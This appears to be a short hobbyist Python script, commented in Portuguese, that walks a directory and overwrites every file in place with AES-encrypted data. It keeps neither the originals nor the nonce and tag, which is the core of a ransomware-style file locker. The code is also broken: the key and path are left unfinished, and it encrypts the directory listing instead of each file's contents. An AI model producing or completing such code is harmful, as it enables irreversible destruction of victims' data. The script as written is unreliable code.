import os #biblioteca para manipular os arquivos
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad , unpad  #Bibliotecas necessárias para criptografia.



senha = b # chave de 16 caracteres = 128 bits
caminho = r #caminho colpleto para o local do arquivo

#cria uma variável que lista os diretório, o "b" é para a lista se lida como binário
listaDeArquivos = os.listdir(caminho)

for nomeArquivo in listaDeArquivos:
    with open( caminho + nomeArquivo, 'rb') as arquivo: 
        #Pega a mensagem do arquivo 
        menasgem = arquivo.read()

    with open(caminho + nomeArquivo, 'wb') as arquivo:
        #Criptografa o conteudo do arquivo
        criptografia = AES.new(senha, AES.MODE_EAX)
        dados = pad(listaDeArquivos, AES.block_size)
        cifra, tag = criptografia.encrypt_and_digest(listaDeArquivos)
        nonce = criptografia.nonce
        #Escreve a cifra no arquivo
        arquivo.write(cifra)